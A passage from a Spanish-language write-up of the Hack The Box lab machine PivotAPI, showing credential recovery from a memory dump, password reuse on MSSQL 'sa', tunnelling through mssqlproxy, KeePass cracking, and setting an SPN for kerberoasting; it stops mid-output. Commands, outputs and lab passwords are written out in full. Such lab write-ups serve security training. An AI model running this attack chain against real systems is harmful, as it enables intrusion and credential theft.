+<p class="plain-text">Vamos al apartado <code class="language-plaintext highlighter-rouge">mapa de memoria</code> y la idea sera buscar una direccion donde el tipo sea <code class="language-plaintext highlighter-rouge">MAP</code> con los mejores privilegios, en este caso solo encontramos <code class="language-plaintext highlighter-rouge">RW-</code></p>
+<a href="/htb/pivotapi/17.png" target="_blank"><div><p><img src="/htb/pivotapi/17.png"></p></div></a>
+
+<p class="plain-text">Si vamos a la representación en el volcado podemos ver la cabecera <code class="language-plaintext highlighter-rouge">MZ</code> lo que nos indica que es un ejecutable para <code class="language-plaintext highlighter-rouge">MS-DOS</code>, en pocas palabras un archivo <code class="language-plaintext highlighter-rouge">exe</code></p>
+<a href="/htb/pivotapi/18.png" target="_blank"><div><p><img src="/htb/pivotapi/18.png"></p></div></a>
+
+<p class="plain-text">Volvemos al mapa de memoria y dumpeamos la <code class="language-plaintext highlighter-rouge">memoria</code> en la direccion donde tenemos el <code class="language-plaintext highlighter-rouge">MAP</code> con los permisos RW-, guardamos esto como un archivo <code class="language-plaintext highlighter-rouge">exe</code></p>
+<a href="/htb/pivotapi/19.png" target="_blank"><div><p><img src="/htb/pivotapi/19.png"></p></div></a>
+
+<p class="plain-text">Este archivo al ser <code class="language-plaintext highlighter-rouge">.NET</code> podemos decompilarlo con <a href="https://github.com/dnSpy/dnSpy">dnspy</a> y ver su codigo fuente, en este encontramos la <code class="language-plaintext highlighter-rouge">contraseña</code> y tenemos credenciales del usuario <code class="language-plaintext highlighter-rouge">svc_oracle</code></p>
+<a href="/htb/pivotapi/20.png" target="_blank"><div><p><img src="/htb/pivotapi/20.png"></p></div></a>
+
+<p class="plain-text">Sin embargo al comprobar las credenciales de svc_oracle con <code class="language-plaintext highlighter-rouge">crackmapexec</code> encontramos que estas las credenciales no son validas a nivel de <code class="language-plaintext highlighter-rouge">dominio</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -u svc_oracle -p </span><span class="am">'#oracle_s3rV1c3!2010'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ro">[-] </span><span class="p">LicorDeBellota.htb\svc_oracle:#oracle_s3rV1c3!2010 STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listando los <code class="language-plaintext highlighter-rouge">usuarios</code> del dominio no encontramos al usuario <code class="language-plaintext highlighter-rouge">svc_oracle</code>, en su lugar buscando por usuarios que inicen por <code class="language-plaintext highlighter-rouge">svc</code> vemos que existe <code class="language-plaintext highlighter-rouge">svc_mssql</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -u kaorz -p Roper4155 --users
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\kaorz:Roper4155 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">Enumerated domain user(s)
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\0xdf                           badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\ippsec                         badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\aDoN90                         badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Jharvar                        badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\OscarAkaElvis                  badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Fiiti                          badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\socketz                        badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Gh0spp7                        badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\FrankyTech                     badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\v1s0r                          badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\borjmz                         badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\manulqwerty                    badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\StooormQ                       badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\0xVIC                          badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\lothbrok                       badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\gibdeon                        badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\sshd                           badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\svc_mssql                      badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Dr.Zaiuss                      badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\superfume                      badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\jari                           badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Kaorz                          badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\3v4Si0N                        badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\krbtgt                         badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\cybervaca                      badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Invitado                       badpwdcount: 0 desc: 
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="am">LicorDeBellota.htb\Administrador                  badpwdcount: 0 desc:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En realidad tiene sentido, volviendo a los mensajes nos dice que hasta el año <code class="language-plaintext highlighter-rouge">2010</code> corria <code class="language-plaintext highlighter-rouge">oracle</code> pero en el año <code class="language-plaintext highlighter-rouge">2020</code> se cambio el servicio de oracle por <code class="language-plaintext highlighter-rouge">mssql</code></p>
+<a href="/htb/pivotapi/21.png" target="_blank"><div><p><img src="/htb/pivotapi/21.png"></p></div></a>
+
+<p class="plain-text">Podemos modificar la <code class="language-plaintext highlighter-rouge">contraseña</code> intentando cambiar los datos que conocemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">#</span><span class="ro">oracle</span><span class="p">_s3rV1c3!</span><span class="ro">2010</span><span class="p">
+#</span><span class="az">mssql</span><span class="p">_s3rV1c3!</span><span class="az">2020</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos comprobar el usuario <code class="language-plaintext highlighter-rouge">svc_mssql</code> que existe a nivel de dominio y la <code class="language-plaintext highlighter-rouge">contraseña</code> que hemos modificado, nos devuelve que son validas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -u svc_mssql -p </span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\svc_mssql:#mssql_s3rV1c3!2020</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-svc_mssql">
+<br><h3 class="post-title">Shell - svc_mssql</h3><br>
+
+<p class="plain-text">Ya que tenemos credenciales válidas podemos usar <code class="language-plaintext highlighter-rouge">bloodhound-python</code> para enumerar usuarios, grupos y privilegios del dominio, esto nos creara un <code class="language-plaintext highlighter-rouge">zip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ bloodhound-python </span><span class="p">-u kaorz -p Roper4155 -d licordebellota.htb -dc pivotapi.licordebellota.htb -ns 10.10.10.240 --zip  
+INFO: Found AD domain: licordebellota.htb
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: pivotapi.licordebellota.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Found 28 users
+INFO: Connecting to LDAP server: pivotapi.licordebellota.htb
+INFO: Found 58 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: PivotAPI.LicorDeBellota.htb
+INFO: Done in 00M 17S
+INFO: Compressing output into 20230708134057_bloodhound.zip</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de subir el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code> podemos ver que el usuario <code class="language-plaintext highlighter-rouge">svc_mssql</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">winrm</code>, sin embargo el puerto <code class="language-plaintext highlighter-rouge">5985</code> no esta expuesto para todos</p>
+<a href="/htb/pivotapi/5.png" target="_blank"><div><p><img src="/htb/pivotapi/5.png"></p></div></a>
+
+<p class="plain-text">Al intentar conectarnos como el usuario <code class="language-plaintext highlighter-rouge">svc_mssql</code> al servicio de mssql nos devuelve un <code class="language-plaintext highlighter-rouge">error</code> el cual nos dice que la autenticación con estas credenciales no es valida</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">licordebellota.htb/svc_mssql:</span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">@pivotapi.licordebellota.htb -windows-auth  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario 'LICORDEBELLOTA\svc_mssql'.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por defecto el usuario <code class="language-plaintext highlighter-rouge">sa</code> es el administrador de mssql, al conectarnos como el utilizando la <code class="language-plaintext highlighter-rouge">contraseña</code> de svc_mssql nos otorga acceso al servidor de <code class="language-plaintext highlighter-rouge">mssql</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">licordebellota.htb/sa:</span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">@pivotapi.licordebellota.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como sa podemos usar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> sin embargo de primeras no nos podemos enviar una <code class="language-plaintext highlighter-rouge">shell</code> o crear un proxy ya que no tenemos <code class="language-plaintext highlighter-rouge">conexion</code> con nuestro equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell ping 10.10.14.10
+
+output
+--------------------------------------------------------------------------  
+
+Haciendo ping a 10.10.14.10 con 32 bytes de datos:
+
+Error general.
+Error general.
+Error general.
+Error general.
+
+Estadísticas de ping para 10.10.14.10:
+    Paquetes: enviados = 4, recibidos = 0, perdidos = 4
+    (100% perdidos),
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de buscar un poco encontramos un <a href="https://github.com/blackarrowsec/mssqlproxy">proyecto</a> que nos permite crear un <code class="language-plaintext highlighter-rouge">proxy</code> a través de la conexion <code class="language-plaintext highlighter-rouge">mssql</code>, para ello usaremos la version modificada de <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> iniciamos ejecutando <code class="language-plaintext highlighter-rouge">enable_ole</code> y subiendo el <code class="language-plaintext highlighter-rouge">reciclador.dll</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">mssqlclient.py licordebellota.htb/sa:</span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">@pivotapi.licordebellota.htb  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL> enable_ole
+SQL> upload reciclador.dll C:\ProgramData\reciclador.dll
+[+] Uploading 'reciclador.dll' to 'C:\ProgramData\reciclador.dll'...
+[+] Size is 111616 bytes
+[+] Upload completed
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora procederemos a instalar el archivo <code class="language-plaintext highlighter-rouge">assembly.dll</code>, esto usando los parametros <code class="language-plaintext highlighter-rouge">-install</code> y <code class="language-plaintext highlighter-rouge">-clr</code> para indicarlo, estos parametros son parte del proyecto modificado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">mssqlclient.py licordebellota.htb/sa:</span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">@pivotapi.licordebellota.htb -install -clr assembly.dll  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[*] Proxy mode: install
+[*] CLR enabled
+[*] Assembly successfully installed
+[*] Procedure successfully installed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente inciamos el <code class="language-plaintext highlighter-rouge">reciclador</code> indicando la ruta del dll, al correrlo este nos abre un <code class="language-plaintext highlighter-rouge">proxy</code> el puerto <code class="language-plaintext highlighter-rouge">1337</code> que podemos indicar en la configuracion de proxychains</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python2 </span><span class="p">mssqlclient.py licordebellota.htb/sa:</span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">@pivotapi.licordebellota.htb -start -reciclador </span><span class="am">'C:\ProgramData\reciclador.dll'</span><span class="p">  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+mssqlproxy - Copyright 2020 BlackArrow
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: Español
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
+[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[*] Proxy mode: check
+[*] Assembly is installed
+[*] Procedure is installed
+[*] reciclador is installed
+[*] clr enabled
+[*] Proxy mode: start
+[*] Listening on port 1337...
+[*] ACK from server!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Pasando a traves del tunel en el puerto 1337 con <code class="language-plaintext highlighter-rouge">proxychains</code> tenemos conexion con el puerto <code class="language-plaintext highlighter-rouge">5985</code> de la maquina asi que nos permitira conectarnos al servicio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q nmap licordebellota.htb -Pn -n -p 5985  
+Nmap scan report for 10.10.10.240
+PORT     STATE SERVICE
+5985/tcp open  wsman</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que el usuario <code class="language-plaintext highlighter-rouge">svc_mssql</code> pertenecia al grupo <code class="language-plaintext highlighter-rouge">winrm</code> deberiamos poder conectarnos a la maquina con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y obtener una <code class="language-plaintext highlighter-rouge">powershell</code> como este</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i licordebellota.htb -u svc_mssql -p </span><span class="am">'#mssql_s3rV1c3!2020'</span><span class="p">  
+PS C:\Users\svc_mssql\Documents> </span><span class="am">whoami</span><span class="p">
+licordebellota\svc_mssql
+PS C:\Users\svc_mssql\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-3v4s10n">
+<br><h3 class="post-title">Shell - 3v4s10n</h3><br>
+
+<p class="plain-text">En el escritorio del usuario <code class="language-plaintext highlighter-rouge">svc_mssql</code> nos encontramos 2 archivos, el primero es una <code class="language-plaintext highlighter-rouge">nota</code> que nos dice que usemos las credenciales para conectarnos a <code class="language-plaintext highlighter-rouge">ssh</code>, ya que el proxy en <code class="language-plaintext highlighter-rouge">mssql</code> nos puede dar varios problemas al usarlo por un largo tiempo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc_mssql\Desktop> </span><span class="am">dir</span><span class="p">
+
+    Directorio: C:\Users\svc_mssql\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         8/8/2020  10:12 PM           2286 credentials.kdbx
+-a----        4/30/2021  10:39 AM             93 note.txt
+
+PS C:\Users\svc_mssql\Desktop> </span><span class="am">type </span><span class="p">note.txt
+Long running MSSQL Proxies can cause issues.  Please switch to SSH after getting credentials.  
+PS C:\Users\svc_mssql\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Tambien hay un archivo <code class="language-plaintext highlighter-rouge">kdbx</code> el cual es un archivo para <code class="language-plaintext highlighter-rouge">keepass</code>, lo descargamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc_mssql\Desktop> </span><span class="am">download </span><span class="p">credentials.kdbx credentials.kdbx
+</span><span class="az">
+Info: Downloading C:\Users\svc_mssql\Desktop\credentials.kdbx to credentials.kdbx  
+
+Info: Download successful!
+</span><span class="p">
+PS C:\Users\svc_mssql\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener la contraseña de este podemos usar <code class="language-plaintext highlighter-rouge">keepass2john</code> que nos creara un <code class="language-plaintext highlighter-rouge">hash</code> que podemos crackear usando <code class="language-plaintext highlighter-rouge">john</code> y obtener la contraseña en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ keepass2john </span><span class="p">credentials.kdbx > hash
+
+</span><span class="ve">❯ john </span><span class="p">-w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash  
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">mahalkita</span><span class="p">        (</span><span class="am">credentials</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">KeePassXC</code> podemos abrir el archivo <code class="language-plaintext highlighter-rouge">kdbx</code> y usar la contraseña crackeada</p>
+<a href="/htb/pivotapi/9.png" target="_blank"><div><p><img src="/htb/pivotapi/9.png"></p></div></a>
+
+<p class="plain-text">Al abrir la db podemos encontrar <code class="language-plaintext highlighter-rouge">credenciales</code> correspondientes al nombre <code class="language-plaintext highlighter-rouge">SSH</code></p>
+<a href="/htb/pivotapi/10.png" target="_blank"><div><p><img src="/htb/pivotapi/10.png"></p></div></a>
+
+<p class="plain-text">Al abrirlas podemos ver la <code class="language-plaintext highlighter-rouge">contraseña</code> en texto plano del usuario <code class="language-plaintext highlighter-rouge">3v4Si0N</code> para ssh</p>
+<a href="/htb/pivotapi/11.png" target="_blank"><div><p><img src="/htb/pivotapi/11.png"></p></div></a>
+
+<p class="plain-text">Comprobamos las credenciales de 3v4Si0N con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y estas son validas tanto por <code class="language-plaintext highlighter-rouge">smb</code> a nivel de dominio como para autenticarnos al servicio <code class="language-plaintext highlighter-rouge">ssh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb licordebellota.htb -u 3v4Si0N -p </span><span class="am">'Gu4nCh3C4NaRi0N!23'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:PIVOTAPI) (domain:LicorDeBellota.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">licordebellota.htb 445    PIVOTAPI         </span><span class="ve">[+] </span><span class="p">LicorDeBellota.htb\3v4Si0N:Gu4nCh3C4NaRi0N!23
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">ssh licordebellota.htb -u 3v4Si0N -p </span><span class="am">'Gu4nCh3C4NaRi0N!23'</span><span class="p">
+</span><span class="az">SSH         </span><span class="p">licordebellota.htb 22     licordebellota.htb </span><span class="az">[*] </span><span class="p">SSH-2.0-OpenSSH_for_Windows_7.7
+</span><span class="az">SSH         </span><span class="p">licordebellota.htb 22     licordebellota.htb </span><span class="ve">[+] </span><span class="p">3v4Si0N:Gu4nCh3C4NaRi0N!23</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> indicaremos el puerto <code class="language-plaintext highlighter-rouge">1337</code> con el parametro <code class="language-plaintext highlighter-rouge">-D</code> para crear el proxy a traves de ssh y no por <code class="language-plaintext highlighter-rouge">mssql</code> como antes, ademas podemos ejecutar <code class="language-plaintext highlighter-rouge">powershell</code> para mas comodidad y leer la primera <code class="language-plaintext highlighter-rouge">flag</code> de bajos privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">3v4Si0N@licordebellota.htb -D 1337
+3v4Si0N@licordebellota.htb's password: Gu4nCh3C4NaRi0N!23
+Microsoft Windows [Versión 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. Todos los derechos reservados.
+
+licordebellota\3v4si0n@PIVOTAPI C:\Users\3v4Si0N></span><span class="am">powershell</span><span class="p">
+Windows PowerShell
+Copyright (C) Microsoft Corporation. Todos los derechos reservados.  
+
+PS C:\Users\3v4Si0N> </span><span class="am">whoami</span><span class="p">
+licordebellota\3v4si0n
+PS C:\Users\3v4Si0N> </span><span class="am">type </span><span class="p">Desktop\user.txt
+1e0**************************a4e 
+PS C:\Users\3v4Si0N></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-dr.zaiuss">
+<br><h3 class="post-title">Shell - dr.zaiuss</h3><br>
+
+<p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">bloodhound</code> ahora podemos buscar una ruta desde el usuario <code class="language-plaintext highlighter-rouge">3v4Si0N</code>, este tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre <code class="language-plaintext highlighter-rouge">Dr.Zaiuss</code> que a su vez tiene privilegios <code class="language-plaintext highlighter-rouge">GenericAll</code> sobre el usuario <code class="language-plaintext highlighter-rouge">Superfume</code> que pertenece al grupo <code class="language-plaintext highlighter-rouge">Developers</code></p>
+<a href="/htb/pivotapi/12.png" target="_blank"><div><p><img src="/htb/pivotapi/12.png"></p></div></a>
+
+<p class="plain-text">Usando el modulo <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a> como el usuario 3v4Si0N podemos setearle un <code class="language-plaintext highlighter-rouge">SPN</code> al usuario Dr.Zaiuss y asi hacer a este usuario vulnerable a un <code class="language-plaintext highlighter-rouge">kerberoasting</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\3v4Si0N> </span><span class="am">Import-Module</span><span class="p"> .\PowerView.ps1
+PS C:\Users\3v4Si0N> </span><span class="am">Set-DomainObject </span><span class="c1">-Identity </span><span class="p">Dr.Zaiuss </span><span class="c1">-Set </span><span class="p">@{serviceprincipalname=</span><span class="az">'not/exist'</span><span class="p">}  
+PS C:\Users\3v4Si0N></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora que este es vulnerable obtenemos el hash de Dr.Zaiuss usando <code class="language-plaintext highlighter-rouge">GetUserSPNs</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetUserSPNs </span><span class="p">licordebellota.htb/3v4Si0N:</span><span class="am">'Gu4nCh3C4NaRi0N!23'</span><span class="p"> -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name       MemberOf                                         PasswordLastSet             LastLogon                   Delegation 
+--------------------  ---------  -----------------------------------------------  --------------------------  --------------------------  ----------
+not/exist             Dr.Zaiuss  CN=WinRM,CN=Users,DC=LicorDeBellota,DC=htb       2021-03-05 15:42:09.868164  2023-07-08 20:41:24.421217             
+
